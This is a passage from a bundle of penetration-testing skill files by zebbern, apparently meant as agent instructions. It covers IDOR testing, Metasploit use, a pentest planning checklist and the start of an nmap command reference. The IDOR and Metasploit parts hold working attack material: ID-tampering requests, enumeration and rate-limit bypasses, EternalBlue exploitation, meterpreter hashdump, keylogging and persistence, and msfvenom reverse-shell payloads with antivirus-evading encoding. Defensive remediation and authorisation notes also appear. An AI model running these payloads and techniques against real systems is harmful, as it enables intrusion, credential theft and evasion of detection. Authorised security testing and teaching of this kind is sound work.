example.com/static/receipt/205.pdf

# Manipulation attempt (User B's receipt)
example.com/static/receipt/200.pdf
```

### 2. Reconnaissance and Setup

#### Create Multiple Test Accounts
```
Account 1: "attacker" - Primary testing account
Account 2: "victim" - Account whose data we attempt to access
```

#### Identify Object References
Capture and analyze requests containing:
- Numeric IDs in URLs: `/api/user/123`
- Numeric IDs in parameters: `?id=123&action=view`
- Numeric IDs in request body: `{"userId": 123}`
- File paths: `/download/receipt_123.pdf`
- GUIDs/UUIDs: `/profile/a1b2c3d4-e5f6-...`

#### Map User IDs
```
# Access user ID endpoint (if available)
GET /api/user-id/

# Note ID patterns:
# - Sequential integers (1, 2, 3...)
# - Auto-incremented values
# - Predictable patterns
```

### 3. Detection Techniques

#### URL Parameter Manipulation
```
# Step 1: Capture original authenticated request
GET /api/user/profile?id=1001 HTTP/1.1
Cookie: session=attacker_session

# Step 2: Modify ID to target another user
GET /api/user/profile?id=1000 HTTP/1.1
Cookie: session=attacker_session

# Vulnerable if: Returns victim's data with attacker's session
```

#### Request Body Manipulation
```
# Original POST request
POST /api/address/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{"id": 5, "userId": 1001, "address": "123 Attacker St"}

# Modified request targeting victim
{"id": 5, "userId": 1000, "address": "123 Attacker St"}
```

#### HTTP Method Switching
```
# Original GET request may be protected
GET /api/admin/users/1000 → 403 Forbidden

# Try alternative methods
POST /api/admin/users/1000 → 200 OK (Vulnerable!)
PUT /api/admin/users/1000 → 200 OK (Vulnerable!)
```

### 4. Exploitation with Burp Suite

#### Manual Exploitation
```
1. Configure browser proxy through Burp Suite
2. Login as "attacker" user
3. Navigate to profile/data page
4. Enable Intercept in Proxy tab
5. Capture request with user ID
6. Modify ID to victim's ID
7. Forward request
8. Observe response for victim's data
```

#### Automated Enumeration with Intruder
```
1. Send request to Intruder (Ctrl+I)
2. Clear all payload positions
3. Select ID parameter as payload position
4. Configure attack type: Sniper
5. Payload settings:
   - Type: Numbers
   - Range: 1 to 10000
   - Step: 1
6. Start attack
7. Analyze responses for 200 status codes
```

#### Battering Ram Attack for Multiple Positions
```
# When same ID appears in multiple locations
PUT /api/addresses/§5§/update HTTP/1.1

{"id": §5§, "userId": 3}

Attack Type: Battering Ram
Payload: Numbers 1-1000
```

### 5. Common IDOR Locations

#### API Endpoints
```
/api/user/{id}
/api/profile/{id}
/api/order/{id}
/api/invoice/{id}
/api/document/{id}
/api/message/{id}
/api/address/{id}/update
/api/address/{id}/delete
```

#### File Downloads
```
/download/invoice_{id}.pdf
/static/receipts/{id}.pdf
/uploads/documents/{filename}
/files/reports/report_{date}_{id}.xlsx
```

#### Query Parameters
```
?userId=123
?orderId=456
?documentId=789
?file=report_123.pdf
?account=user@email.com
```

## Quick Reference

### IDOR Testing Checklist

| Test | Method | Indicator of Vulnerability |
|------|--------|---------------------------|
| Increment/Decrement ID | Change `id=5` to `id=4` | Returns different user's data |
| Use Victim's ID | Replace with known victim ID | Access granted to victim's resources |
| Enumerate Range | Test IDs 1-1000 | Find valid records of other users |
| Negative Values | Test `id=-1` or `id=0` | Unexpected data or errors |
| Large Values | Test `id=99999999` | System information disclosure |
| String IDs | Change format `id=user_123` | Logic bypass |
| GUID Manipulation | Modify UUID portions | Predictable UUID patterns |

### Response Analysis

| Status Code | Interpretation |
|-------------|----------------|
| 200 OK | Potential IDOR - verify data ownership |
| 403 Forbidden | Access control working |
| 404 Not Found | Resource doesn't exist |
| 401 Unauthorized | Authentication required |
| 500 Error | Potential input validation issue |

### Common Vulnerable Parameters

| Parameter Type | Examples |
|----------------|----------|
| User identifiers | `userId`, `uid`, `user_id`, `account` |
| Resource identifiers | `id`, `pid`, `docId`, `fileId` |
| Order/Transaction | `orderId`, `transactionId`, `invoiceId` |
| Message/Communication | `messageId`, `threadId`, `chatId` |
| File references | `filename`, `file`, `document`, `path` |

## Constraints and Limitations

### Operational Boundaries
- Requires at least two valid user accounts for verification
- Some applications use session-bound tokens instead of IDs
- GUID/UUID references harder to enumerate but not impossible
- Rate limiting may restrict enumeration attempts
- Some IDOR requires chained vulnerabilities to exploit

### Detection Challenges
- Horizontal privilege escalation (user-to-user) vs vertical (user-to-admin)
- Blind IDOR where response doesn't confirm access
- Time-based IDOR in asynchronous operations
- IDOR in websocket communications

### Legal Requirements
- Only test applications with explicit authorization
- Document all testing activities and findings
- Do not access, modify, or exfiltrate real user data
- Report findings through proper disclosure channels

## Examples

### Example 1: Basic ID Parameter IDOR
```
# Login as attacker (userId=1001)
# Navigate to profile page

# Original request
GET /api/profile?id=1001 HTTP/1.1
Cookie: session=abc123

# Response: Attacker's profile data

# Modified request (targeting victim userId=1000)
GET /api/profile?id=1000 HTTP/1.1
Cookie: session=abc123

# Vulnerable Response: Victim's profile data returned!
```

### Example 2: IDOR in Address Update Endpoint
```
# Intercept address update request
PUT /api/addresses/5/update HTTP/1.1
Content-Type: application/json
Cookie: session=attacker_session

{
  "id": 5,
  "userId": 1001,
  "street": "123 Main St",
  "city": "Test City"
}

# Modify userId to victim's ID
{
  "id": 5,
  "userId": 1000,  # Changed from 1001
  "street": "Hacked Address",
  "city": "Exploit City"
}

# If 200 OK: Address created under victim's account
```

### Example 3: Static File IDOR
```
# Download own receipt
GET /api/download/5 HTTP/1.1
Cookie: session=attacker_session

# Response: PDF of attacker's receipt (order #5)

# Attempt to access other receipts
GET /api/download/3 HTTP/1.1
Cookie: session=attacker_session

# Vulnerable Response: PDF of victim's receipt (order #3)!
```

### Example 4: Burp Intruder Enumeration
```
# Configure Intruder attack
Target: PUT /api/addresses/§1§/update
Payload Position: Address ID in URL and body

Attack Configuration:
- Type: Battering Ram
- Payload: Numbers 0-20, Step 1

Body Template:
{
  "id": §1§,
  "userId": 3
}

# Analyze results:
# - 200 responses indicate successful modification
# - Check victim's account for new addresses
```

### Example 5: Horizontal to Vertical Escalation
```
# Step 1: Enumerate user roles
GET /api/user/1 → {"role": "user", "id": 1}
GET /api/user/2 → {"role": "user", "id": 2}
GET /api/user/3 → {"role": "admin", "id": 3}

# Step 2: Access admin functions with discovered ID
GET /api/admin/dashboard?userId=3 HTTP/1.1
Cookie: session=regular_user_session

# If accessible: Vertical privilege escalation achieved
```

## Troubleshooting

### Issue: All Requests Return 403 Forbidden
**Cause**: Server-side access control is implemented
**Solution**:
```
# Try alternative attack vectors:
1. HTTP method switching (GET → POST → PUT)
2. Add X-Original-URL or X-Rewrite-URL headers
3. Try parameter pollution: ?id=1001&id=1000
4. URL encoding variations: %31%30%30%30 for "1000"
5. Case variations for string IDs
```

### Issue: Application Uses UUIDs Instead of Sequential IDs
**Cause**: Randomized identifiers reduce enumeration risk
**Solution**:
```
# UUID discovery techniques:
1. Check response bodies for leaked UUIDs
2. Search JavaScript files for hardcoded UUIDs
3. Check API responses that list multiple objects
4. Look for UUID patterns in error messages
5. Try UUID v1 (time-based) prediction if applicable
```

### Issue: Session Token Bound to User
**Cause**: Application validates session against requested resource
**Solution**:
```
# Advanced bypass attempts:
1. Test for IDOR in unauthenticated endpoints
2. Check password reset/email verification flows
3. Look for IDOR in file upload/download
4. Test API versioning: /api/v1/ vs /api/v2/
5. Check mobile API endpoints (often less protected)
```

### Issue: Rate Limiting Blocks Enumeration
**Cause**: Application implements request throttling
**Solution**:
```
# Bypass techniques:
1. Add delays between requests (Burp Intruder throttle)
2. Rotate IP addresses (proxy chains)
3. Target specific high-value IDs instead of full range
4. Use different endpoints for same resources
5. Test during off-peak hours
```

### Issue: Cannot Verify IDOR Impact
**Cause**: Response doesn't clearly indicate data ownership
**Solution**:
```
# Verification methods:
1. Create unique identifiable data in victim account
2. Look for PII markers (name, email) in responses
3. Compare response lengths between users
4. Check for timing differences in responses
5. Use secondary indicators (creation dates, metadata)
```

## Remediation Guidance

### Implement Proper Access Control
```python
# Django example - validate ownership
def update_address(request, address_id):
    address = Address.objects.get(id=address_id)

    # Verify ownership before allowing update
    if address.user != request.user:
        return HttpResponseForbidden("Unauthorized")

    # Proceed with update
    address.update(request.data)
```

### Use Indirect References
```python
# Instead of: /api/address/123
# Use: /api/address/current-user/billing

def get_address(request):
    # Always filter by authenticated user
    address = Address.objects.filter(user=request.user).first()
    return address
```

### Server-Side Validation
```python
# Always validate on server, never trust client input
def download_receipt(request, receipt_id):
    receipt = Receipt.objects.filter(
        id=receipt_id,
        user=request.user  # Critical: filter by current user
    ).first()

    if not receipt:
        return HttpResponseNotFound()

    return FileResponse(receipt.file)
```


---

<a id="metasploitframework"></a>

## Metasploit Framework

---
name: Metasploit Framework
description: This skill should be used when the user asks to "use Metasploit for penetration testing", "exploit vulnerabilities with msfconsole", "create payloads with msfvenom", "perform post-exploitation", "use auxiliary modules for scanning", or "develop custom exploits". It provides comprehensive guidance for leveraging the Metasploit Framework in security assessments.
metadata:
  author: zebbern
  version: "1.1"
---

# Metasploit Framework

## Purpose

Leverage the Metasploit Framework for comprehensive penetration testing, from initial exploitation through post-exploitation activities. Metasploit provides a unified platform for vulnerability exploitation, payload generation, auxiliary scanning, and maintaining access to compromised systems during authorized security assessments.

## Prerequisites

### Required Tools
```bash
# Metasploit comes pre-installed on Kali Linux
# For other systems:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Start PostgreSQL for database support
sudo systemctl start postgresql
sudo msfdb init
```

### Required Knowledge
- Network and system fundamentals
- Understanding of vulnerabilities and exploits
- Basic programming concepts
- Target enumeration techniques

### Required Access
- Written authorization for testing
- Network access to target systems
- Understanding of scope and rules of engagement

## Outputs and Deliverables

1. **Exploitation Evidence** - Screenshots and logs of successful compromises
2. **Session Logs** - Command history and extracted data
3. **Vulnerability Mapping** - Exploited vulnerabilities with CVE references
4. **Post-Exploitation Artifacts** - Credentials, files, and system information

## Core Workflow

### Phase 1: MSFConsole Basics

Launch and navigate the Metasploit console:

```bash
# Start msfconsole
msfconsole

# Quiet mode (skip banner)
msfconsole -q

# Basic navigation commands
msf6 > help                    # Show all commands
msf6 > search [term]           # Search modules
msf6 > use [module]            # Select module
msf6 > info                    # Show module details
msf6 > show options            # Display required options
msf6 > set [OPTION] [value]    # Configure option
msf6 > run / exploit           # Execute module
msf6 > back                    # Return to main console
msf6 > exit                    # Exit msfconsole
```

### Phase 2: Module Types

Understand the different module categories:

```bash
# 1. Exploit Modules - Target specific vulnerabilities
msf6 > show exploits
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Payload Modules - Code executed after exploitation
msf6 > show payloads
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 3. Auxiliary Modules - Scanning, fuzzing, enumeration
msf6 > show auxiliary
msf6 > use auxiliary/scanner/smb/smb_version

# 4. Post-Exploitation Modules - Actions after compromise
msf6 > show post
msf6 > use post/windows/gather/hashdump

# 5. Encoders - Obfuscate payloads
msf6 > show encoders
msf6 > set ENCODER x86/shikata_ga_nai

# 6. Nops - No-operation padding for buffer overflows
msf6 > show nops

# 7. Evasion - Bypass security controls
msf6 > show evasion
```

### Phase 3: Searching for Modules

Find appropriate modules for targets:

```bash
# Search by name
msf6 > search eternalblue

# Search by CVE
msf6 > search cve:2017-0144

# Search by platform
msf6 > search platform:windows type:exploit

# Search by type and keyword
msf6 > search type:auxiliary smb

# Filter by rank (excellent, great, good, normal, average, low, manual)
msf6 > search rank:excellent

# Combined search
msf6 > search type:exploit platform:linux apache

# View search results columns:
# Name, Disclosure Date, Rank, Check (if it can verify vulnerability), Description
```

### Phase 4: Configuring Exploits

Set up an exploit for execution:

```bash
# Select exploit module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# View required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target host
msf6 exploit(...) > set RHOSTS 192.168.1.100

# Set target port (if different from default)
msf6 exploit(...) > set RPORT 445

# View compatible payloads
msf6 exploit(...) > show payloads

# Set payload
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local host for reverse connection
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > set LPORT 4444

# View all options again to verify
msf6 exploit(...) > show options

# Check if target is vulnerable (if supported)
msf6 exploit(...) > check

# Execute exploit
msf6 exploit(...) > exploit
# or
msf6 exploit(...) > run
```

### Phase 5: Payload Types

Select appropriate payload for the situation:

```bash
# Singles - Self-contained, no staging
windows/shell_reverse_tcp
linux/x86/shell_bind_tcp

# Stagers - Small payload that downloads larger stage
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/bind_tcp

# Stages - Downloaded by stager, provides full functionality
# Meterpreter, VNC, shell

# Payload naming convention:
# [platform]/[architecture]/[payload_type]/[connection_type]
# Examples:
windows/x64/meterpreter/reverse_tcp
linux/x86/shell/bind_tcp
php/meterpreter/reverse_tcp
java/meterpreter/reverse_https
android/meterpreter/reverse_tcp
```

### Phase 6: Meterpreter Session

Work with Meterpreter post-exploitation:

```bash
# After successful exploitation, you get Meterpreter prompt
meterpreter >

# System Information
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# File System Operations
meterpreter > pwd
meterpreter > ls
meterpreter > cd C:\\Users
meterpreter > download file.txt /tmp/
meterpreter > upload /tmp/tool.exe C:\\

# Process Management
meterpreter > ps
meterpreter > migrate [PID]
meterpreter > kill [PID]

# Networking
meterpreter > ipconfig
meterpreter > netstat
meterpreter > route
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.1

# Privilege Escalation
meterpreter > getsystem
meterpreter > getprivs

# Credential Harvesting
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector

# Screenshots and Keylogging
meterpreter > screenshot
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Shell Access
meterpreter > shell
C:\Windows\system32> whoami
C:\Windows\system32> exit
meterpreter >

# Background Session
meterpreter > background
msf6 exploit(...) > sessions -l
msf6 exploit(...) > sessions -i 1
```

### Phase 7: Auxiliary Modules

Use auxiliary modules for reconnaissance:

```bash
# SMB Version Scanner
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# Port Scanner
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set PORTS 1-1000
msf6 auxiliary(...) > run

# SSH Version Scanner
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(...) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(...) > run

# FTP Anonymous Login
msf6 > use auxiliary/scanner/ftp/anonymous
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# HTTP Directory Scanner
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > run

# Brute Force Modules
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(...) > set RHOSTS 192.168.1.100
msf6 auxiliary(...) > set USER_FILE /usr/share/wordlists/users.txt
msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(...) > run
```

### Phase 8: Post-Exploitation Modules

Run post modules on active sessions:

```bash
# List sessions
msf6 > sessions -l

# Run post module on specific session
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(...) > run

# Or run directly from Meterpreter
meterpreter > run post/windows/gather/hashdump

# Common Post Modules
# Credential Gathering
post/windows/gather/credentials/credential_collector
post/windows/gather/lsa_secrets
post/windows/gather/cachedump
post/multi/gather/ssh_creds

# System Enumeration
post/windows/gather/enum_applications
post/windows/gather/enum_logged_on_users
post/windows/gather/enum_shares
post/linux/gather/enum_configs

# Privilege Escalation
post/windows/escalate/getsystem
post/multi/recon/local_exploit_suggester

# Persistence
post/windows/manage/persistence_exe
post/linux/manage/sshkey_persistence

# Pivoting
post/multi/manage/autoroute
```

### Phase 9: Payload Generation with msfvenom

Create standalone payloads:

```bash
# Basic Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# ASP web shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# WAR file (Tomcat)
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o shell.apk

# Encoded payload (evade AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# List available formats
msfvenom --list formats

# List available encoders
msfvenom --list encoders
```

### Phase 10: Setting Up Handlers

Configure listener for incoming connections:

```bash
# Manual handler setup
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# The -j flag runs as background job
msf6 > jobs -l

# When payload executes on target, session opens
[*] Meterpreter session 1 opened

# Interact with session
msf6 > sessions -i 1
```

## Quick Reference

### Essential MSFConsole Commands

| Command | Description |
|---------|-------------|
| `search [term]` | Search for modules |
| `use [module]` | Select a module |
| `info` | Display module information |
| `show options` | Show configurable options |
| `set [OPT] [val]` | Set option value |
| `setg [OPT] [val]` | Set global option |
| `run` / `exploit` | Execute module |
| `check` | Verify target vulnerability |
| `back` | Deselect module |
| `sessions -l` | List active sessions |
| `sessions -i [N]` | Interact with session |
| `jobs -l` | List background jobs |
| `db_nmap` | Run nmap with database |

### Meterpreter Essential Commands

| Command | Description |
|---------|-------------|
| `sysinfo` | System information |
| `getuid` | Current user |
| `getsystem` | Attempt privilege escalation |
| `hashdump` | Dump password hashes |
| `shell` | Drop to system shell |
| `upload/download` | File transfer |
| `screenshot` | Capture screen |
| `keyscan_start` | Start keylogger |
| `migrate [PID]` | Move to another process |
| `background` | Background session |
| `portfwd` | Port forwarding |

### Common Exploit Modules

```bash
# Windows
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms08_067_netapi
exploit/windows/http/iis_webdav_upload_asp
exploit/windows/local/bypassuac

# Linux
exploit/linux/ssh/sshexec
exploit/linux/local/overlayfs_priv_esc
exploit/multi/http/apache_mod_cgi_bash_env_exec

# Web Applications
exploit/multi/http/tomcat_mgr_upload
exploit/unix/webapp/wp_admin_shell_upload
exploit/multi/http/jenkins_script_console
```

## Constraints and Limitations

### Legal Requirements
- Only use on systems you own or have written authorization to test
- Document all testing activities
- Follow rules of engagement
- Report all findings to appropriate parties

### Technical Limitations
- Modern AV/EDR may detect Metasploit payloads
- Some exploits require specific target configurations
- Firewall rules may block reverse connections
- Not all exploits work on all target versions

### Operational Security
- Use encrypted channels (reverse_https) when possible
- Clean up artifacts after testing
- Avoid detection by monitoring systems
- Limit post-exploitation to agreed scope

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Database not connected | Run `sudo msfdb init`, start PostgreSQL, then `db_connect` |
| Exploit fails/no session | Run `check`; verify payload architecture; check firewall; try different payloads |
| Session dies immediately | Migrate to stable process; use stageless payload; check AV; use AutoRunScript |
| Payload detected by AV | Use encoding `-e x86/shikata_ga_nai -i 10`; use evasion modules; custom templates |


---

<a id="pentestchecklist"></a>

## Pentest Checklist

---
name: Pentest Checklist
description: This skill should be used when the user asks to "plan a penetration test", "create a security assessment checklist", "prepare for penetration testing", "define pentest scope", "follow security testing best practices", or needs a structured methodology for penetration testing engagements.
metadata:
  author: zebbern
  version: "1.1"
---

# Pentest Checklist

## Purpose

Provide a comprehensive checklist for planning, executing, and following up on penetration tests. Ensure thorough preparation, proper scoping, and effective remediation of discovered vulnerabilities.

## Inputs/Prerequisites

- Clear business objectives for testing
- Target environment information
- Budget and timeline constraints
- Stakeholder contacts and authorization
- Legal agreements and scope documents

## Outputs/Deliverables

- Defined pentest scope and objectives
- Prepared testing environment
- Security monitoring data
- Vulnerability findings report
- Remediation plan and verification

## Core Workflow

### Phase 1: Scope Definition

#### Define Objectives

- [ ] **Clarify testing purpose** - Determine goals (find vulnerabilities, compliance, customer assurance)
- [ ] **Validate pentest necessity** - Ensure penetration test is the right solution
- [ ] **Align outcomes with objectives** - Define success criteria

**Reference Questions:**
- Why are you doing this pentest?
- What specific outcomes do you expect?
- What will you do with the findings?

#### Know Your Test Types

| Type | Purpose | Scope |
|------|---------|-------|
| External Pentest | Assess external attack surface | Public-facing systems |
| Internal Pentest | Assess insider threat risk | Internal network |
| Web Application | Find application vulnerabilities | Specific applications |
| Social Engineering | Test human security | Employees, processes |
| Red Team | Full adversary simulation | Entire organization |

#### Enumerate Likely Threats

- [ ] **Identify high-risk areas** - Where could damage occur?
- [ ] **Assess data sensitivity** - What data could be compromised?
- [ ] **Review legacy systems** - Old systems often have vulnerabilities
- [ ] **Map critical assets** - Prioritize testing targets

#### Define Scope

- [ ] **List in-scope systems** - IPs, domains, applications
- [ ] **Define out-of-scope items** - Systems to avoid
- [ ] **Set testing boundaries** - What techniques are allowed?
- [ ] **Document exclusions** - Third-party systems, production data

#### Budget Planning

| Factor | Consideration |
|--------|---------------|
| Asset Value | Higher value = higher investment |
| Complexity | More systems = more time |
| Depth Required | Thorough testing costs more |
| Reputation Value | Brand-name firms cost more |

**Budget Reality Check:**
- Cheap pentests often produce poor results
- Align budget with asset criticality
- Consider ongoing vs. one-time testing

### Phase 2: Environment Preparation

#### Prepare Test Environment

- [ ] **Production vs. staging decision** - Determine where to test
- [ ] **Set testing limits** - No DoS on production
- [ ] **Schedule testing window** - Minimize business impact
- [ ] **Create test accounts** - Provide appropriate access levels

**Environment Options:**
```
Production  - Realistic but risky
Staging     - Safer but may differ from production
Clone       - Ideal but resource-intensive
```

#### Run Preliminary Scans

- [ ] **Execute vulnerability scanners** - Find known issues first
- [ ] **Fix obvious vulnerabilities** - Don't waste pentest time
- [ ] **Document existing issues** - Share with testers

**Common Pre-Scan Tools:**
```bash
# Network vulnerability scan
nmap -sV --script vuln TARGET

# Web vulnerability scan
nikto -h http://TARGET
```

#### Review Security Policy

- [ ] **Verify compliance requirements** - GDPR, PCI-DSS, HIPAA
- [ ] **Document data handling rules** - Sensitive data procedures
- [ ] **Confirm legal authorization** - Get written permission

#### Notify Hosting Provider

- [ ] **Check provider policies** - What testing is allowed?
- [ ] **Submit authorization requests** - AWS, Azure, GCP requirements
- [ ] **Document approvals** - Keep records

**Cloud Provider Policies:**
- AWS: https://aws.amazon.com/security/penetration-testing/
- Azure: https://docs.microsoft.com/security/pentest
- GCP: https://cloud.google.com/security/overview

#### Freeze Developments

- [ ] **Stop deployments during testing** - Maintain consistent environment
- [ ] **Document current versions** - Record system states
- [ ] **Avoid critical patches** - Unless security emergency

### Phase 3: Expertise Selection

#### Find Qualified Pentesters

- [ ] **Seek recommendations** - Ask trusted sources
- [ ] **Verify credentials** - OSCP, GPEN, CEH, CREST
- [ ] **Check references** - Talk to previous clients
- [ ] **Match expertise to scope** - Web, network, mobile specialists

**Evaluation Criteria:**

| Factor | Questions to Ask |
|--------|------------------|
| Experience | Years in field, similar projects |
| Methodology | OWASP, PTES, custom approach |
| Reporting | Sample reports, detail level |
| Communication | Availability, update frequency |

#### Define Methodology

- [ ] **Select testing standard** - PTES, OWASP, NIST
- [ ] **Determine access level** - Black box, gray box, white box
- [ ] **Agree on techniques** - Manual vs. automated testing
- [ ] **Set communication schedule** - Updates and escalation

**Testing Approaches:**

| Type | Access Level | Simulates |
|------|-------------|-----------|
| Black Box | No information | External attacker |
| Gray Box | Partial access | Insider with limited access |
| White Box | Full access | Insider/detailed audit |

#### Define Report Format

- [ ] **Review sample reports** - Ensure quality meets needs
- [ ] **Specify required sections** - Executive summary, technical details
- [ ] **Request machine-readable output** - CSV, XML for tracking
- [ ] **Agree on risk ratings** - CVSS, custom scale

**Report Should Include:**
- Executive summary for management
- Technical findings with evidence
- Risk ratings and prioritization
- Remediation recommendations
- Retesting guidance

### Phase 4: Monitoring

#### Implement Security Monitoring

- [ ] **Deploy IDS/IPS** - Intrusion detection systems
- [ ] **Enable logging** - Comprehensive audit trails
- [ ] **Configure SIEM** - Centralized log analysis
- [ ] **Set up alerting** - Real-time notifications

**Monitoring Tools:**
```bash
# Check security logs
tail -f /var/log/auth.log
tail -f /var/log/apache2/access.log

# Monitor network
tcpdump -i eth0 -w capture.pcap
```

#### Configure Logging

- [ ] **Centralize logs** - Aggregate from all systems
- [ ] **Set retention periods** - Keep logs for analysis
- [ ] **Enable detailed logging** - Application and system level
- [ ] **Test log collection** - Verify all sources working

**Key Logs to Monitor:**
- Authentication events
- Application errors
- Network connections
- File access
- System changes

#### Monitor Exception Tools

- [ ] **Track error rates** - Unusual spikes indicate testing
- [ ] **Brief operations team** - Distinguish testing from attacks
- [ ] **Document baseline** - Normal vs. pentest activity

#### Watch Security Tools

- [ ] **Review IDS alerts** - Separate pentest from real attacks
- [ ] **Monitor WAF logs** - Track blocked attempts
- [ ] **Check endpoint protection** - Antivirus detections

### Phase 5: Remediation

#### Ensure Backups

- [ ] **Verify backup integrity** - Test restoration
- [ ] **Document recovery procedures** - Know how to restore
- [ ] **Separate backup access** - Protect from testing

#### Reserve Remediation Time

- [ ] **Allocate team availability** - Post-pentest analysis
- [ ] **Schedule fix implementation** - Address findings
- [ ] **Plan verification testing** - Confirm fixes work

#### Patch During Testing Policy

- [ ] **Generally avoid patching** - Maintain consistent environment
- [ ] **Exception for critical issues** - Security emergencies only
- [ ] **Communicate changes** - Inform pentesters of any changes

#### Cleanup Procedure

- [ ] **Remove test artifacts** - Backdoors, scripts, files
- [ ] **Delete test accounts** - Remove pentester access
- [ ] **Restore configurations** - Return to original state
- [ ] **Verify cleanup complete** - Audit all changes

#### Schedule Next Pentest

- [ ] **Determine frequency** - Annual, quarterly, after changes
- [ ] **Consider continuous testing** - Bug bounty, ongoing assessments
- [ ] **Budget for future tests** - Plan ahead

**Testing Frequency Factors:**
- Release frequency
- Regulatory requirements
- Risk tolerance
- Past findings severity

## Quick Reference

### Pre-Pentest Checklist

```
□ Scope defined and documented
□ Authorization obtained
□ Environment prepared
□ Hosting provider notified
□ Team briefed
□ Monitoring enabled
□ Backups verified
```

### Post-Pentest Checklist

```
□ Report received and reviewed
□ Findings prioritized
□ Remediation assigned
□ Fixes implemented
□ Verification testing scheduled
□ Environment cleaned up
□ Next test scheduled
```

## Constraints

- Production testing carries inherent risks
- Budget limitations affect thoroughness
- Time constraints may limit coverage
- Tester expertise varies significantly
- Findings become stale quickly

## Examples

### Example 1: Quick Scope Definition

```markdown
**Target:** Corporate web application (app.company.com)
**Type:** Gray box web application pentest
**Duration:** 5 business days
**Excluded:** DoS testing, production database access
**Access:** Standard user account provided
```

### Example 2: Monitoring Setup

```bash
# Enable comprehensive logging
sudo systemctl restart rsyslog
sudo systemctl restart auditd

# Start packet capture
tcpdump -i eth0 -w /tmp/pentest_capture.pcap &
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Scope creep | Document and require change approval |
| Testing impacts production | Schedule off-hours, use staging |
| Findings disputed | Provide detailed evidence, retest |
| Remediation delayed | Prioritize by risk, set deadlines |
| Budget exceeded | Define clear scope, fixed-price contracts |


---

<a id="pentestcommands"></a>

## Pentest Commands

---
name: Pentest Commands
description: This skill should be used when the user asks to "run pentest commands", "scan with nmap", "use metasploit exploits", "crack passwords with hydra or john", "scan web vulnerabilities with nikto", "enumerate networks", or needs essential penetration testing command references.
metadata:
  author: zebbern
  version: "1.1"
---

# Pentest Commands

## Purpose

Provide a comprehensive command reference for penetration testing tools including network scanning, exploitation, password cracking, and web application testing. Enable quick command lookup during security assessments.

## Inputs/Prerequisites

- Kali Linux or penetration testing distribution
- Target IP addresses with authorization
- Wordlists for brute forcing
- Network access to target systems
- Basic understanding of tool syntax

## Outputs/Deliverables

- Network enumeration results
- Identified vulnerabilities
- Exploitation payloads
- Cracked credentials
- Web vulnerability findings

## Core Workflow

### 1. Nmap Commands

**Host Discovery:**

```bash
# Ping sweep
nmap -sP 192.168.1.0/24

# List IPs without scanning
nmap -sL 192.168.1.0/24

# Ping scan (host discovery)
nmap -sn 192.168.1.0/24
```

**Port Scanning:**

```bash
# TCP SYN scan (stealth)
nmap -sS 192.168.1.1

# Full TCP connect scan
nmap -sT 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# All ports (1-65535)
nmap -p- 192.168.1.1

# Specific ports
nmap -p 22,80,443 192.168.1.1
```

**Service Detection:**

```bash
# Service versions
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Comprehensive scan
nmap -A 192.168.1.1

# Skip host discovery
nmap -Pn 192.168.1.1
```

**NSE Scripts:**

```bash
# Vulnerability scan
nmap --script vuln 192.168.1.1

# SMB enumeration
nmap --script smb-enum-shares -p 445 192.168.1.1

# HTTP enumeration
nmap --script http-enum -p 80 192.168.1.1

# Check EternalBlue
nmap --script smb-vuln-ms17-010 192.168.1.1

